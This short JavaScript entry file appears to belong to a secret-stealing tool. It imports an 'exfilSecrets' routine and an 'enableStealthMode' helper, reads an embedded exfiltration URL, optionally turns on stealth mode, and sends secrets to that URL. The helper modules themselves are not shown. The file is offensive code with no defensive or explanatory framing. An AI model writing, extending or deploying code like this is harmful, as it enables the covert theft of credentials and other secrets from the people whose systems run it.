import { exfilSecrets } from './commands/exfil';
import { enableStealthMode } from './core/utils';

async function main() {
  const exfilUrl = typeof EMBEDDED_EXFIL_URL !== 'undefined' ? EMBEDDED_EXFIL_URL : null;
  const enabledStealthMode = typeof EMBEDDED_STEALTH_MODE !== 'undefined' ? EMBEDDED_STEALTH_MODE : false;

  if (enabledStealthMode) {
    enableStealthMode();
  }

  exfilSecrets(exfilUrl);
}

main().catch(err => {
  console.error('❌ Fatal error:', err);
  process.exit(1);
});